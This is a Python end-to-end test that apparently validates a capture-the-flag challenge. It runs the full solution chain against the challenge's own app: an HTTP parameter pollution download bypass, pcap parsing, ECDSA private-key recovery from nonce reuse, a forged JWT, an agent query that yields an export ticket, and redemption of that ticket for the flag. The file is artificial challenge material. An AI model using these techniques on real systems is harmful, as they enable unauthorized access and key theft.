"""
Full End-to-End Regression Test Suite (Ultra Hard Specification).
Validates that the entire 5-stage attack chain functions seamlessly together.
"""

import os
import struct
import json
import re
from starlette.testclient import TestClient
from scapy.all import rdpcap, TCP, Raw

from src.server import app
from src.config import (
    FLAG,
    PCAP_FILENAME,
    TARGET_KID,
    TARGET_CASE_ID,
    TARGET_ARCHIVE_ID,
    JWT_ISSUER,
    JWT_AUDIENCE,
    JWT_REQUIRED_SCOPE,
    compute_manifest_mac
)
from src.crypto_relay import (
    compute_krp_digest,
    recover_private_key_nonce_reuse,
    create_oracle_jwt
)

client = TestClient(app)

def test_complete_attack_chain_end_to_end(tmp_path):
    # -----------------------------------------------------------------
    # STAGE 1: WEB EXPLOITATION (Presigned HPP)
    # -----------------------------------------------------------------
    # 1. Direct access without MAC blocked
    res_direct = client.get(f"/api/diagnostics/download?ref={PCAP_FILENAME}")
    assert res_direct.status_code == 403

    # 2. Acquire valid MAC for diagnostic-pub-01
    mac = compute_manifest_mac("diagnostic-pub-01")

    # 3. Presigned HPP exploit
    res_hpp = client.get(f"/api/diagnostics/download?ref=diagnostic-pub-01&ref={PCAP_FILENAME}&mac={mac}")
    assert res_hpp.status_code == 200
    pcap_data = res_hpp.content
    assert len(pcap_data) > 1000

    pcap_file = tmp_path / "downloaded.pcap"
    pcap_file.write_bytes(pcap_data)

    # -----------------------------------------------------------------
    # STAGE 2: DIGITAL FORENSICS
    # -----------------------------------------------------------------
    packets = rdpcap(str(pcap_file))
    stream = bytearray()
    for p in packets:
        if TCP in p and p[TCP].sport == 9111 and Raw in p:
            stream.extend(p[Raw].load)

    messages = []
    idx = 0
    total = len(stream)
    while idx + 8 <= total:
        if stream[idx:idx+4] == b"KRP\x01":
            mlen = struct.unpack(">I", stream[idx+4:idx+8])[0]
            start = idx + 8
            end = start + mlen
            if end <= total:
                messages.append(json.loads(stream[start:end].decode('utf-8')))
                idx = end
            else:
                break
        else:
            idx += 1

    key_announce = next(m for m in messages if m.get("action") == "KEY_EXCHANGE_ANNOUNCE")
    target_key_entry = next(k for k in key_announce["keys"] if k["kid"] == TARGET_KID)
    pub_hex = target_key_entry["public_key_hex"]
    target_pub_x = int(pub_hex[2:66], 16)
    target_pub_y = int(pub_hex[66:130], 16)

    transactions = [m for m in messages if "signature" in m and "signed_message" in m]
    r_map = {}
    for tx in transactions:
        kid = tx["kid"]
        r = int(tx["signature"]["r"], 16)
        s = int(tx["signature"]["s"], 16)
        key = (kid, r)
        if key not in r_map:
            r_map[key] = []
        r_map[key].append((tx, s))

    target_pair = None
    for (kid, r_val), items in r_map.items():
        if kid == TARGET_KID and len(items) > 1:
            tx1, s1 = items[0]
            tx2, s2 = items[1]
            if tx1["signed_message"] != tx2["signed_message"]:
                target_pair = (tx1, s1, tx2, s2, r_val)
                break

    assert target_pair is not None
    tx1, s1, tx2, s2, r_val = target_pair

    # -----------------------------------------------------------------
    # STAGE 3: ADVANCED CRYPTOGRAPHY (Domain Separation & Nonce Reuse)
    # -----------------------------------------------------------------
    m1 = tx1["signed_message"]
    m2 = tx2["signed_message"]
    
    z1 = compute_krp_digest(
        action=m1["action"],
        timestamp=m1["timestamp"],
        seq=m1["seq"],
        payload_dict=m1["payload"]
    )
    z2 = compute_krp_digest(
        action=m2["action"],
        timestamp=m2["timestamp"],
        seq=m2["seq"],
        payload_dict=m2["payload"]
    )

    recovered_d = recover_private_key_nonce_reuse(
        z1=z1,
        r=r_val,
        s1=s1,
        z2=z2,
        s2=s2,
        target_pub_x=target_pub_x,
        target_pub_y=target_pub_y
    )
    assert recovered_d is not None

    oracle_jwt = create_oracle_jwt(
        d_int=recovered_d,
        kid=TARGET_KID,
        case_id=TARGET_CASE_ID,
        issuer=JWT_ISSUER,
        audience=JWT_AUDIENCE,
        scope=JWT_REQUIRED_SCOPE
    )

    # -----------------------------------------------------------------
    # STAGE 4: LLM / AGENT SECURITY (Multi-Tool Chaining)
    # -----------------------------------------------------------------
    auth_header = {"Authorization": f"Bearer {oracle_jwt}"}

    res_agent = client.post(
        "/api/oracle/query",
        headers=auth_header,
        json={"query": f"Review incident logs and reconciliation status for {TARGET_CASE_ID}"}
    )
    assert res_agent.status_code == 200
    agent_resp = res_agent.json()["oracle_response"]
    assert "Generated Archive Export Ticket: TICKET-SEAL11-" in agent_resp

    ticket_match = re.search(r"TICKET-SEAL11-[a-f0-9]+", agent_resp)
    assert ticket_match is not None
    ticket_id = ticket_match.group(0)

    # -----------------------------------------------------------------
    # STAGE 5: TICKET REDEMPTION & FLAG DELIVERY
    # -----------------------------------------------------------------
    res_redeem = client.post(
        "/api/archive/redeem",
        headers=auth_header,
        json={"ticket": ticket_id, "case_id": TARGET_CASE_ID}
    )
    assert res_redeem.status_code == 200
    flag_delivered = res_redeem.json()["archive_details"]["flag"]
    assert flag_delivered == FLAG

    # Single-use check: repeat attempt fails
    res_repeat = client.post(
        "/api/archive/redeem",
        headers=auth_header,
        json={"ticket": ticket_id, "case_id": TARGET_CASE_ID}
    )
    assert res_repeat.status_code == 400
